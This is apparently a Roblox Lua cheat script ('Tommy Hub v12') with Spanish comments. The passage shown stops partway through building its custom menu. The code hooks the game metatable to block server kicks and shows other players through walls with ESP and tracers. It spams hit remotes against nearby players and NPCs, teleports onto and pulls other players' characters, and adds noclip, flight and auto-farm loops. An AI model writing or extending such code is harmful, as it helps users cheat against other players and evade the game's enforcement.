-- ╔══════════════════════════════════════════════════════════╗
-- ║         TOMMY HUB  v12  PREMIUM  |  by terrino48         ║
-- ║         Interfaz 100% custom — sin librerías externas    ║
-- ╚══════════════════════════════════════════════════════════╝

local Players           = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local UserInputService  = game:GetService("UserInputService")
local RunService        = game:GetService("RunService")
local TweenService      = game:GetService("TweenService")
local CoreGui           = game:GetService("CoreGui")

local lp     = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- ═══════════════════════════════════════════════════════════
--  ESTADO GLOBAL
-- ═══════════════════════════════════════════════════════════
getgenv().SelectedPlayer    = nil
getgenv().TrackingActive    = false
getgenv().KillTrackerActive = false
getgenv().TPDirectActive    = false
getgenv().FastAttackEnabled = false
getgenv().FastAttackRange   = math.huge
getgenv().SkyTrackerActive  = false
getgenv().TrackerHeight     = 300
getgenv().InstaTPSkyHeight  = 300
getgenv().InstaTPSkyActive  = false
getgenv().WalkOnWater       = false
getgenv().NoclipEnabled     = false
getgenv().SpinEnabled       = false
getgenv().SpinSpeed         = 50
getgenv().MagnetEnabled     = false
getgenv().MagnetRange       = 800
getgenv().MagnetDistance    = 6
getgenv().PullForce         = 0.7

_G.WalkSpeedValue   = 40
_G.WalkSpeedEnabled = false
_G.JumpPowerValue   = 50
_G.JumpPowerEnabled = false
_G.InfiniteJump     = false

local skyConn           = nil
local DashEnabled       = false
local DashConn          = nil
local DashLengh         = 1
local autoV4            = false
local v4Conn            = nil
local GhostTpEnabled    = false
local GhostTpConn       = nil
local ghostFrame        = 0
local GHOST_RATIO       = 2
local GhostCFrame       = nil
local BlinkMode         = false
local XOff,YOff,ZOff   = 0, 1.5, 3.5
local flying            = false
local flySpeed          = 60
local bv, bg
local ESPEnabled        = false
local ESPObjects        = {}
local ESPColor          = Color3.new(0,1,1)
local TrackConn         = nil
local RegisterHit       = nil
local RegisterAttack    = nil
local FastAttackConn    = nil
local InfMeleeOn        = false
local InfSwordOn        = false
local InfMeleeConn      = nil
local InfSwordConn      = nil
local InfElevMConn      = nil
local InfElevSConn      = nil
local orbitM            = 0
local orbitS            = 0
local UP_SPEED          = 1e35
local speedActive       = false
local speedVal          = 16
local ZoomEnabled       = false
local maxZoom           = 500
local abilityLock       = false
local frozenCF          = nil
local Unbreakable       = false
local UnbreakConn       = nil
local AntiTP_On         = false
local AntiTP_Thresh     = 10
local AntiTP_LastPos    = nil
local AntiTP_Conn       = nil
local FakeLag_On        = false
local FakeLag_Int       = 0.1
local FakeLag_Dur       = 0.05
local Tracers_On        = false
local Tracers_Color     = Color3.fromRGB(255,165,0)
local Tracers_Thick     = 1.5
local TracerLines       = {}
local Farm_Orbit        = false
local Farm_Above        = false
local Farm_Magnet       = false
local Farm_Raid         = false
local Farm_OSpd         = 5
local Farm_ODist        = 15
local Farm_AHeight      = 12
local Farm_MHeight      = -4
local Farm_MForce       = 0.15
local Farm_RSpd         = 16
local FruitAttack       = false
local FruitConn         = nil

-- ═══════════════════════════════════════════════════════════
--  CARGAR REMOTES
-- ═══════════════════════════════════════════════════════════
task.spawn(function()
    pcall(function()
        local M  = ReplicatedStorage:WaitForChild("Modules",10)
        local N  = M:WaitForChild("Net",10)
        RegisterHit    = N:WaitForChild("RE/RegisterHit",10)
        RegisterAttack = N:WaitForChild("RE/RegisterAttack",10)
    end)
end)

-- ═══════════════════════════════════════════════════════════
--  ANTI AFK + ANTI KICK
-- ═══════════════════════════════════════════════════════════
task.spawn(function()
    while true do
        task.wait(55)
        pcall(function()
            local V = game:GetService("VirtualInputManager")
            V:SendKeyEvent(true, Enum.KeyCode.W, false, game)
            task.wait(0.1)
            V:SendKeyEvent(false, Enum.KeyCode.W, false, game)
        end)
    end
end)

pcall(function()
    local mt  = getrawmetatable(game)
    local old = mt.__namecall
    setreadonly(mt, false)
    mt.__namecall = newcclosure(function(self, ...)
        if getnamecallmethod() == "Kick" then return end
        return old(self, ...)
    end)
    setreadonly(mt, true)
end)

-- ═══════════════════════════════════════════════════════════
--  UTILIDADES
-- ═══════════════════════════════════════════════════════════
local function TpTo(cf)
    local r = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if r then r.CFrame = cf end
end

local function GetNearestPlayer()
    local best, dist = nil, math.huge
    if not lp.Character or not lp.Character:FindFirstChild("HumanoidRootPart") then return nil end
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= lp and v.Character and v.Character:FindFirstChild("HumanoidRootPart") then
            local d = (lp.Character.HumanoidRootPart.Position - v.Character.HumanoidRootPart.Position).Magnitude
            if d < dist then dist = d; best = v end
        end
    end
    return best
end

local function GetNearestNPC()
    local myHRP = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP then return nil end
    local closest, bestD = nil, math.huge
    for _, v in pairs(workspace:GetDescendants()) do
        if v:IsA("Model") and v ~= lp.Character then
            local hum = v:FindFirstChildOfClass("Humanoid")
            local hrp = v:FindFirstChild("HumanoidRootPart")
            if hum and hrp and hum.Health > 0 and not Players:GetPlayerFromCharacter(v) then
                local d = (myHRP.Position - hrp.Position).Magnitude
                if d < bestD then bestD = d; closest = v end
            end
        end
    end
    return closest
end

local function GetPlayerList()
    local n = {}
    for _, v in pairs(Players:GetPlayers()) do
        if v ~= lp then table.insert(n, v.Name) end
    end
    return #n == 0 and {"Ninguno"} or n
end

-- ═══════════════════════════════════════════════════════════
--  ESP
-- ═══════════════════════════════════════════════════════════
local function ClearESP()
    for _, o in pairs(ESPObjects) do if o then o:Destroy() end end
    ESPObjects = {}
end

local function CreateESP(target)
    if not target or not target:FindFirstChild("Head") then return end
    if target.Head:FindFirstChild("TommyESP") then return end
    local bb = Instance.new("BillboardGui", target.Head)
    bb.Name = "TommyESP"; bb.Adornee = target.Head
    bb.Size = UDim2.new(0,130,0,55); bb.StudsOffset = Vector3.new(0,3,0); bb.AlwaysOnTop = true
    local lbl = Instance.new("TextLabel", bb)
    lbl.BackgroundTransparency = 1; lbl.Size = UDim2.new(1,0,1,0)
    lbl.Font = "GothamBold"; lbl.TextSize = 13; lbl.TextStrokeTransparency = 0.3
    lbl.TextColor3 = ESPColor
    task.spawn(function()
        while bb and bb.Parent and ESPEnabled do
            pcall(function()
                local myH = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
                local tH  = target:FindFirstChild("HumanoidRootPart")
                if myH and tH then
                    lbl.Text = target.Name .. "\n[" .. math.floor((myH.Position-tH.Position).Magnitude) .. "m]"
                    lbl.TextColor3 = ESPColor
                end
            end)
            task.wait(0.5)
        end
        if bb then bb:Destroy() end
    end)
    table.insert(ESPObjects, bb)
end

local function UpdateESP()
    ClearESP()
    if not ESPEnabled then return end
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= lp and p.Character then CreateESP(p.Character) end
    end
    local en = workspace:FindFirstChild("Enemies")
    if en then for _, n in pairs(en:GetChildren()) do CreateESP(n) end end
end
task.spawn(function() while true do task.wait(3) if ESPEnabled then UpdateESP() end end end)

-- ═══════════════════════════════════════════════════════════
--  TRACERS
-- ═══════════════════════════════════════════════════════════
local function CreateTracer(p)
    if p == lp then return end
    local line = Drawing.new("Line")
    line.Visible = false; line.Color = Tracers_Color; line.Thickness = Tracers_Thick; line.Transparency = 1
    local conn
    conn = RunService.RenderStepped:Connect(function()
        if not Players:FindFirstChild(p.Name) then line:Remove(); conn:Disconnect(); TracerLines[p]=nil; return end
        if Tracers_On and lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
            local mp,mon = Camera:WorldToViewportPoint(lp.Character.HumanoidRootPart.Position)
            local ep,eon = Camera:WorldToViewportPoint(p.Character.HumanoidRootPart.Position)
            if mon and eon then
                line.From=Vector2.new(mp.X,mp.Y); line.To=Vector2.new(ep.X,ep.Y)
                line.Color=Tracers_Color; line.Thickness=Tracers_Thick; line.Visible=true
            else line.Visible=false end
        else line.Visible=false end
    end)
    TracerLines[p] = {line=line,conn=conn}
end
Players.PlayerAdded:Connect(CreateTracer)
Players.PlayerRemoving:Connect(function(p)
    if TracerLines[p] then TracerLines[p].line:Remove(); TracerLines[p].conn:Disconnect(); TracerLines[p]=nil end
end)
for _, p in pairs(Players:GetPlayers()) do CreateTracer(p) end

-- ═══════════════════════════════════════════════════════════
--  VUELO
-- ═══════════════════════════════════════════════════════════
local function StopFly()
    flying = false
    if bv then bv:Destroy(); bv=nil end
    if bg then bg:Destroy(); bg=nil end
    pcall(function()
        if lp.Character then
            local h = lp.Character:FindFirstChildOfClass("Humanoid")
            if h then h.PlatformStand=false; h:ChangeState(Enum.HumanoidStateType.GettingUp) end
            local a = lp.Character:FindFirstChild("Animate")
            if a then a.Disabled=false end
        end
    end)
end

local function StartFly()
    local char = lp.Character
    if not char or not char:FindFirstChild("HumanoidRootPart") then return end
    getgenv().InstaTPSkyActive = false; StopFly(); flying = true
    local root = char.HumanoidRootPart
    local anim = char:FindFirstChild("Animate")
    if anim then anim.Disabled=true end
    bg = Instance.new("BodyGyro",root); bg.D=100; bg.P=9e4; bg.MaxTorque=Vector3.new(9e9,9e9,9e9); bg.CFrame=root.CFrame
    bv = Instance.new("BodyVelocity",root); bv.Velocity=Vector3.zero; bv.MaxForce=Vector3.new(9e9,9e9,9e9)
    task.spawn(function()
        while flying and char.Parent and root.Parent do
            local c=workspace.CurrentCamera; local cf=c.CFrame
            local fwd=Vector3.new(cf.LookVector.X,0,cf.LookVector.Z).Unit
            local rt=Vector3.new(cf.RightVector.X,0,cf.RightVector.Z).Unit
            local vel=Vector3.zero
            if UserInputService:IsKeyDown(Enum.KeyCode.W) then vel=vel+fwd*flySpeed end
            if UserInputService:IsKeyDown(Enum.KeyCode.S) then vel=vel-fwd*flySpeed end
            if UserInputService:IsKeyDown(Enum.KeyCode.D) then vel=vel+rt*flySpeed end
            if UserInputService:IsKeyDown(Enum.KeyCode.A) then vel=vel-rt*flySpeed end
            local yv=0
            if UserInputService:IsKeyDown(Enum.KeyCode.Space) then yv=flySpeed end
            if UserInputService:IsKeyDown(Enum.KeyCode.LeftShift) then yv=-flySpeed end
            bv.Velocity=Vector3.new(vel.X,yv,vel.Z)
            bg.CFrame=CFrame.new(root.Position)*CFrame.Angles(0,math.atan2(-cf.LookVector.X,-cf.LookVector.Z),0)
            task.wait()
        end
        StopFly()
    end)
end

-- ═══════════════════════════════════════════════════════════
--  FAST ATTACK FUSIONADO
-- ═══════════════════════════════════════════════════════════
local function IsUsingAbility(char)
    if not char then return false end
    local h = char:FindFirstChild("Humanoid"); if not h then return false end
    local a = h:FindFirstChild("Animator")
    if a then
        for _, t in pairs(a:GetPlayingAnimationTracks()) do
            local n=t.Name:lower()
            if n:find("skill") or n:find("ability") or n:find("dash") or n:find("cast") or n:find("fruit") then return true end
        end
    end
    if h:GetState()==Enum.HumanoidStateType.Physics then return true end
    return false
end

local function GetLockOn()
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= lp and p.Character and p.Character:FindFirstChildOfClass("Highlight") then return p.Character end
    end
    local en = workspace:FindFirstChild("Enemies")
    if en then for _, n in pairs(en:GetChildren()) do if n:FindFirstChildOfClass("Highlight") then return n end end end
    return nil
end

RunService.Heartbeat:Connect(function()
    local char = lp.Character; local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then return end
    local using = IsUsingAbility(char)
    if using and not abilityLock then abilityLock=true; frozenCF=hrp.CFrame end
    if abilityLock and using then hrp.CFrame=frozenCF end
    if not using and abilityLock then abilityLock=false; frozenCF=nil end
end)

local function AttackTargets(targets)
    if not RegisterHit or not RegisterAttack then return end
    pcall(function()
        if not targets or #targets==0 then return end
        local all={}
        for _, c in pairs(targets) do
            local head=c:FindFirstChild("Head")
            if head then table.insert(all,{c,head}) end
        end
        if #all==0 then return end
        RegisterAttack:FireServer(0); task.wait()
        RegisterHit:FireServer(all[1][2],all)
    end)
end

local function GetTargets()
    if abilityLock then return {} end
    local lock = GetLockOn()
    if lock then return {lock} end
    local myHRP = lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
    if not myHRP then return {} end
    local t={}
    for _, p in pairs(Players:GetPlayers()) do
        if p ~= lp and p.Character then
            local h=p.Character:FindFirstChild("Humanoid"); local r=p.Character:FindFirstChild("HumanoidRootPart")
            if h and r and h.Health>0 then table.insert(t,p.Character) end
        end
    end
    local en=workspace:FindFirstChild("Enemies")
    if en then
        for _, n in pairs(en:GetChildren()) do
            local h=n:FindFirstChild("Humanoid"); local r=n:FindFirstChild("HumanoidRootPart")
            if h and r and h.Health>0 then table.insert(t,n) end
        end
    end
    return t
end

local function StartFastAttack()
    if FastAttackConn then task.cancel(FastAttackConn); FastAttackConn=nil end
    FastAttackConn = task.spawn(function()
        while getgenv().FastAttackEnabled do
            local t=GetTargets(); if #t>0 then AttackTargets(t) end; task.wait(0.05)
        end
    end)
end

-- ═══════════════════════════════════════════════════════════
--  INF RANGE MELEE / SWORD
-- ═══════════════════════════════════════════════════════════
local VIM = game:GetService("VirtualInputManager")

local function StartInfMelee()
    if InfMeleeConn then task.cancel(InfMeleeConn) end
    InfMeleeConn = task.spawn(function()
        while InfMeleeOn do
            task.wait(0.1)
            local char=lp.Character; local h=char and char:FindFirstChild("Humanoid"); local r=char and char:FindFirstChild("HumanoidRootPart")
            if r and h and h.Health>0 then
                orbitM+=math.rad(500); r.CFrame=r.CFrame*CFrame.new(math.cos(orbitM)*3,0,math.sin(orbitM)*3)
                pcall(function() ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso") end)
                for _, tool in pairs(lp.Backpack:GetChildren()) do
                    if tool:IsA("Tool") and (tool.ToolTip=="Melee" or tool.Name:lower():find("fist") or tool.Name:lower():find("melee") or tool.Name:lower():find("combat")) then h:EquipTool(tool) end
                end
                task.wait(0.25)
                VIM:SendKeyEvent(true,Enum.KeyCode.Z,false,game); task.wait(0.1); VIM:SendKeyEvent(false,Enum.KeyCode.Z,false,game)
                task.wait(0.4); h.Health=0
            end
        end
    end)
    if InfElevMConn then InfElevMConn:Disconnect() end
    InfElevMConn = RunService.RenderStepped:Connect(function(dt)
        if InfMeleeOn then local r=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if r then r.CFrame=r.CFrame+Vector3.new(0,UP_SPEED*dt,0) end end
    end)
end

local function StartInfSword()
    if InfSwordConn then task.cancel(InfSwordConn) end
    InfSwordConn = task.spawn(function()
        while InfSwordOn do
            task.wait(0.1)
            local char=lp.Character; local h=char and char:FindFirstChild("Humanoid"); local r=char and char:FindFirstChild("HumanoidRootPart")
            if r and h and h.Health>0 then
                orbitS+=math.rad(500); r.CFrame=r.CFrame*CFrame.new(math.cos(orbitS)*3,0,math.sin(orbitS)*3)
                pcall(function() ReplicatedStorage.Remotes.CommF_:InvokeServer("Buso") end)
                for _, tool in pairs(lp.Backpack:GetChildren()) do
                    if tool:IsA("Tool") and (tool.ToolTip=="Sword" or tool.Name:lower():find("sword") or tool.Name:lower():find("katana") or tool.Name:lower():find("blade")) then h:EquipTool(tool) end
                end
                task.wait(0.25)
                VIM:SendKeyEvent(true,Enum.KeyCode.Z,false,game); task.wait(0.1); VIM:SendKeyEvent(false,Enum.KeyCode.Z,false,game)
                task.wait(0.4); h.Health=0
            end
        end
    end)
    if InfElevSConn then InfElevSConn:Disconnect() end
    InfElevSConn = RunService.RenderStepped:Connect(function(dt)
        if InfSwordOn then local r=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if r then r.CFrame=r.CFrame+Vector3.new(0,UP_SPEED*dt,0) end end
    end)
end

-- ═══════════════════════════════════════════════════════════
--  MAGNETO
-- ═══════════════════════════════════════════════════════════
task.spawn(function()
    while true do
        task.wait(0.02)
        if getgenv().MagnetEnabled then
            pcall(function()
                local myHRP=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if not myHRP then return end
                local function Atraer(e)
                    local eH=e:FindFirstChild("HumanoidRootPart"); local eHum=e:FindFirstChild("Humanoid")
                    if eH and eHum and eHum.Health>0 and (eH.Position-myHRP.Position).Magnitude<=getgenv().MagnetRange then
                        eH.CFrame=eH.CFrame:Lerp(myHRP.CFrame*CFrame.new(0,0,-getgenv().MagnetDistance),getgenv().PullForce)
                        eH.CanCollide=false
                    end
                end
                local en=workspace:FindFirstChild("Enemies"); if en then for _,n in pairs(en:GetChildren()) do Atraer(n) end end
                for _,p in pairs(Players:GetPlayers()) do if p~=lp and p.Character then Atraer(p.Character) end end
            end)
        end
    end
end)

-- ═══════════════════════════════════════════════════════════
--  ANTI TRACKER
-- ═══════════════════════════════════════════════════════════
local function StartAntiTracker()
    pcall(function() local h=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if h then AntiTP_LastPos=h.CFrame end end)
    if AntiTP_Conn then AntiTP_Conn:Disconnect() end
    AntiTP_Conn = RunService.Heartbeat:Connect(function()
        if not AntiTP_On then return end
        pcall(function()
            local h=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if not h then return end
            if AntiTP_LastPos then
                local d=(h.Position-AntiTP_LastPos.Position).Magnitude
                if d>AntiTP_Thresh then h.CFrame=AntiTP_LastPos else AntiTP_LastPos=h.CFrame end
            else AntiTP_LastPos=h.CFrame end
        end)
    end)
end

task.spawn(function() while true do task.wait(FakeLag_Int) if FakeLag_On then local s=tick() while tick()-s<FakeLag_Dur do end end end end)

-- ═══════════════════════════════════════════════════════════
--  TRACKER
-- ═══════════════════════════════════════════════════════════
local function StartTracker()
    if TrackConn then TrackConn:Disconnect() end
    TrackConn = RunService.Heartbeat:Connect(function()
        if not getgenv().TrackingActive or not getgenv().SelectedPlayer then return end
        pcall(function()
            local target=Players:FindFirstChild(getgenv().SelectedPlayer); if not (target and target.Character) then return end
            local tH=target.Character:FindFirstChild("HumanoidRootPart"); local myH=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            if not (tH and myH) then return end
            if getgenv().TPDirectActive then myH.CFrame=tH.CFrame*CFrame.new(0,1.5,3.5)
            elseif getgenv().KillTrackerActive then myH.CFrame=tH.CFrame+Vector3.new(0,getgenv().TrackerHeight,0) end
        end)
    end)
end

task.spawn(function()
    while true do
        task.wait(0.01)
        pcall(function()
            if not getgenv().InstaTPSkyActive or not getgenv().SelectedPlayer then return end
            local target=Players:FindFirstChild(getgenv().SelectedPlayer); local myH=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart")
            if target and target.Character and myH then
                local tH=target.Character:FindFirstChild("HumanoidRootPart")
                if tH then
                    for _,v in pairs(lp.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide=false end end
                    myH.CFrame=tH.CFrame*CFrame.new(0,getgenv().InstaTPSkyHeight,0)
                end
            end
        end)
    end
end)

-- ═══════════════════════════════════════════════════════════
--  RUNTIME LOOPS
-- ═══════════════════════════════════════════════════════════
RunService.Heartbeat:Connect(function()
    if not lp.Character then return end
    pcall(function()
        local root=lp.Character:FindFirstChild("HumanoidRootPart"); local hum=lp.Character:FindFirstChildOfClass("Humanoid")
        if getgenv().NoclipEnabled then for _,v in pairs(lp.Character:GetDescendants()) do if v:IsA("BasePart") then v.CanCollide=false end end end
        if getgenv().WalkOnWater and root and root.Position.Y<20 then
            local p=root.Position; root.CFrame=CFrame.new(p.X,21,p.Z)*(root.CFrame-root.Position)
        end
        if speedActive and hum and hum.MoveDirection.Magnitude>0 then lp.Character:TranslateBy(hum.MoveDirection*(speedVal/55)) end
        if getgenv().SpinEnabled and root then root.CFrame=root.CFrame*CFrame.Angles(0,math.rad(getgenv().SpinSpeed),0) end
    end)
end)
RunService.RenderStepped:Connect(function()
    lp.CameraMaxZoomDistance = ZoomEnabled and maxZoom or 128
end)
UserInputService.JumpRequest:Connect(function()
    if _G.InfiniteJump and lp.Character and lp.Character:FindFirstChild("Humanoid") then
        lp.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
    end
end)

-- Farm loops
task.spawn(function() while true do task.wait() if Farm_Orbit then pcall(function()
    local myH=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if not myH then return end
    local npc=GetNearestNPC(); if not npc then return end
    local nH=npc:FindFirstChild("HumanoidRootPart"); if not nH then return end
    local t=tick()*Farm_OSpd; local pos=nH.Position+Vector3.new(math.cos(t)*Farm_ODist,3,math.sin(t)*Farm_ODist)
    myH.CFrame=myH.CFrame:Lerp(CFrame.lookAt(pos,nH.Position),0.2)
end) end end end)
task.spawn(function() while true do task.wait() if Farm_Above then pcall(function()
    local myH=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if not myH then return end
    local npc=GetNearestNPC(); if not npc then return end
    local nH=npc:FindFirstChild("HumanoidRootPart"); if not nH then return end
    myH.CFrame=myH.CFrame:Lerp(CFrame.new(nH.Position+Vector3.new(0,Farm_AHeight,0)),0.15)
end) end end end)
task.spawn(function() while true do task.wait(0.02) if Farm_Magnet then pcall(function()
    local myH=lp.Character and lp.Character:FindFirstChild("HumanoidRootPart"); if not myH then return end
    local npc=GetNearestNPC(); if not npc then return end
    local nH=npc:FindFirstChild("HumanoidRootPart")
    if nH then nH.CFrame=nH.CFrame:Lerp(CFrame.new(myH.Position+Vector3.new(0,Farm_MHeight,0)),Farm_MForce); nH.CanCollide=false end
end) end end end)
task.spawn(function() while true do task.wait(0.05) if Farm_Raid then pcall(function()
    local char=lp.Character; local myH=char and char:FindFirstChild("HumanoidRootPart"); local hum=char and char:FindFirstChildOfClass("Humanoid")
    if not myH or not hum then return end
    local npc=GetNearestNPC(); if not npc then return end
    local nH=npc:FindFirstChild("HumanoidRootPart"); if not nH then return end
    hum.WalkSpeed=Farm_RSpd; hum:MoveTo(nH.Position)
end) end end end)

-- ═══════════════════════════════════════════════════════════════════════
--
--   ██████╗ ██╗   ██╗██╗
--  ██╔════╝ ██║   ██║██║
--  ██║  ███╗██║   ██║██║
--  ██║   ██║██║   ██║██║
--  ╚██████╔╝╚██████╔╝██║
--   ╚═════╝  ╚═════╝ ╚═╝
--
--  INTERFAZ PREMIUM 100% CUSTOM
-- ═══════════════════════════════════════════════════════════════════════

-- ──────────── PALETA ────────────
local C = {
    BG          = Color3.fromRGB(8,   8,  16),
    BG2         = Color3.fromRGB(14,  14, 28),
    BG3         = Color3.fromRGB(20,  18, 40),
    PANEL       = Color3.fromRGB(16,  14, 32),
    ACCENT1     = Color3.fromRGB(120, 60, 255),
    ACCENT2     = Color3.fromRGB(180, 80, 255),
    ACCENT3     = Color3.fromRGB(60,  20, 160),
    TEXT        = Color3.fromRGB(240, 235, 255),
    TEXTDIM     = Color3.fromRGB(140, 130, 170),
    ON          = Color3.fromRGB(80,  220, 120),
    OFF         = Color3.fromRGB(80,   80, 100),
    RED         = Color3.fromRGB(220,  60,  60),
    GOLD        = Color3.fromRGB(255, 200,  50),
    BORDER      = Color3.fromRGB(80,  40, 180),
}

-- ──────────── HELPERS ────────────
local function Corner(r, p) local c=Instance.new("UICorner",p); c.CornerRadius=UDim.new(0,r); return c end
local function Stroke(w, col, p) local s=Instance.new("UIStroke",p); s.Thickness=w; s.Color=col; return s end
local function Grad(c0,c1,rot, p) local g=Instance.new("UIGradient",p); g.Color=ColorSequence.new(c0,c1); g.Rotation=rot; return g end
local function Pad(l,r,t,b, p)
    local pad=Instance.new("UIPadding",p)
    pad.PaddingLeft=UDim.new(0,l); pad.PaddingRight=UDim.new(0,r)
    pad.PaddingTop=UDim.new(0,t);  pad.PaddingBottom=UDim.new(0,b)
    return pad
end
local function Tween(obj, t, props)
    TweenService:Create(obj, TweenInfo.new(t, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), props):Play()
end
local function New(cls, props, parent)
    local o = Instance.new(cls)
    for k,v in pairs(props) do o[k]=v end
    if parent then o.Parent=parent end
    return o
end

-- ──────────── DESTROY OLD ────────────
pcall(function()
    if CoreGui:FindFirstChild("TommyHub_v4") then CoreGui.TommyHub_v4:Destroy() end
end)

-- ──────────── SCREEN GUI ────────────
local ScreenGui = New("ScreenGui", {
    Name="TommyHub_v4", ResetOnSpawn=false, ZIndexBehavior=Enum.ZIndexBehavior.Global,
    IgnoreGuiInset=true,
}, CoreGui)

-- ──────────── TAMAÑOS ────────────
local FULL = UDim2.fromOffset(520, 600)
local isMinimized = false

-- ──────────── MAIN FRAME ────────────
local Main = New("Frame", {
    Size=FULL, Position=UDim2.new(0.5,-260,0.05,0),
    BackgroundColor3=C.BG, BorderSizePixel=0,
    Active=true, Draggable=true,
    ClipsDescendants=true,
}, ScreenGui)
Corner(16, Main)
Stroke(1.5, C.BORDER, Main)
Grad(C.BG, C.BG2, 120, Main)

-- Sombra exterior
New("ImageLabel", {
    Size=UDim2.new(1,40,1,40), Position=UDim2.new(0,-20,0,-20),
    BackgroundTransparency=1,
    Image="rbxassetid://5028857084",
    ImageColor3=Color3.fromRGB(0,0,0),
    ImageTransparency=0.4,
    ZIndex=0,
}, Main)

-- ──────────── LOGO MINIMIZADO ────────────
-- Imagen flotante que se muestra cuando está minimizado
local LogoBtn = New("ImageButton", {
    Size=UDim2.fromOffset(90, 90),
    Position=UDim2.new(0, 10, 0.5, 0),
    -- Imagen de Tommy Hub (logo neón colorido de la imagen 2)
    Image="rbxassetid://80300168077461",
    BackgroundColor3=Color3.fromRGB(15,5,35),
    BorderSizePixel=0,
    Visible=false,
    ZIndex=50,
    Active=true,
}, ScreenGui)
Corner(45, LogoBtn) -- círculo
Stroke(2.5, Color3.fromRGB(160,60,255), LogoBtn)

-- Brillo animado en el logo
local logoGlow = New("ImageLabel",{
    Size=UDim2.new(1,20,1,20), Position=UDim2.new(0,-10,0,-10),
    Image="rbxassetid://5028857084",
    ImageColor3=Color3.fromRGB(120,40,255),
    ImageTransparency=0.5,
    BackgroundTransparency=1, ZIndex=49,
},LogoBtn)

-- Pulso del logo
task.spawn(function()
    while true do
        if isMinimized then
            Tween(logoGlow,1,{ImageTransparency=0.7})
            task.wait(1)
            Tween(logoGlow,1,{ImageTransparency=0.3})
            task.wait(1)
        else task.wait(0.5) end
    end
end)

-- Texto debajo del logo
New("TextLabel",{
    Size=UDim2.fromOffset(110,18), Position=UDim2.new(0.5,-55,1,4),
    Text="TOMMY HUB v12", TextColor3=Color3.fromRGB(200,150,255),
    Font=Enum.Font.GothamBlack, TextSize=9,
    BackgroundTransparency=1, ZIndex=51,
},LogoBtn)

-- Click en logo → abre el hub
LogoBtn.MouseButton1Click:Connect(function()
    isMinimized = false
    LogoBtn.Visible = false
    Tween(Main, 0.35, {Size=FULL})
    Main.ClipsDescendants = true
end)

-- Drag del logo
do
    local draggingLogo = false
    local dragStart, startPos
    LogoBtn.InputBegan:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            draggingLogo = true
            dragStart  = i.Position
            startPos   = LogoBtn.Position
        end
    end)
    UserInputService.InputChanged:Connect(function(i)
        if draggingLogo then
            if i.UserInputType == Enum.UserInputType.MouseMovement or i.UserInputType == Enum.UserInputType.Touch then
                local delta = i.Position - dragStart
                LogoBtn.Position = UDim2.new(
                    startPos.X.Scale, startPos.X.Offset + delta.X,
                    startPos.Y.Scale, startPos.Y.Offset + delta.Y
                )
            end
        end
    end)
    UserInputService.InputEnded:Connect(function(i)
        if i.UserInputType == Enum.UserInputType.MouseButton1 or i.UserInputType == Enum.UserInputType.Touch then
            draggingLogo = false
        end
    end)
end

-- ──────────── TOP BAR ────────────
local TopBar = New("Frame", {
    Size=UDim2.new(1,0,0,50), BackgroundColor3=C.BG3, BorderSizePixel=0, ZIndex=5,
}, Main)
Corner(16, TopBar)
Grad(Color3.fromRGB(110,45,230), Color3.fromRGB(55,18,130), 90, TopBar)

-- Fix bordes inferiores redondeados del topbar
New("Frame", {
    Size=UDim2.new(1,0,0.5,0), Position=UDim2.new(0,0,0.5,0),
    BackgroundColor3=Color3.fromRGB(82,34,175), BorderSizePixel=0, ZIndex=4,
}, TopBar)

-- Crown
New("TextLabel", {
    Size=UDim2.fromOffset(36,36), Position=UDim2.new(0,10,0.5,-18),
    Text="👑", TextSize=26, Font=Enum.Font.GothamBlack,
    BackgroundTransparency=1, ZIndex=6,
}, TopBar)

-- Título
New("TextLabel", {
    Size=UDim2.new(0,200,0,22), Position=UDim2.new(0,52,0,6),
    Text="TOMMY HUB", TextColor3=Color3.new(1,1,1),
    Font=Enum.Font.GothamBlack, TextSize=17,
    TextXAlignment=Enum.TextXAlignment.Left,
    BackgroundTransparency=1, ZIndex=6,
}, TopBar)

New("TextLabel", {
    Size=UDim2.new(0,220,0,14), Position=UDim2.new(0,52,0,28),
    Text="v12 PREMIUM  ·  by terrino48",
    TextColor3=Color3.fromRGB(190,150,255),
    Font=Enum.Font.GothamBold, TextSize=9,
    TextXAlignment=Enum.TextXAlignment.Left,
    BackgroundTransparency=1, ZIndex=6,
}, TopBar)

-- Botones control
local function MakeCtrlBtn(txt, xOff, col, hoverCol)
    local b = New("TextButton", {
        Size=UDim2.fromOffset(28,28),
        Position=UDim2.new(1,xOff,0.5,-14),
        Text=txt, TextColor3=Color3.new(1,1,1),
        BackgroundColor3=col,
        Font=Enum.Font.GothamBold, TextSize=14,
        BorderSizePixel=0, ZIndex=8,
    }, TopBar)
    Corner(7, b)
    b.MouseEnter:Connect(function() Tween(b,0.15,{BackgroundColor3=hoverCol}) end)
    b.MouseLeave:Connect(function() Tween(b,0.15,{BackgroundColor3=col}) end)
    return b
end

local CloseBtn = MakeCtrlBtn("✕", -36, Color3.fromRGB(180,40,40), Color3.fromRGB(220,60,60))
local MinBtn   = MakeCtrlBtn("−", -68, Color3.fromRGB(60,60,100), Color3.fromRGB(90,90,140))

CloseBtn.MouseButton1Click:Connect(function()
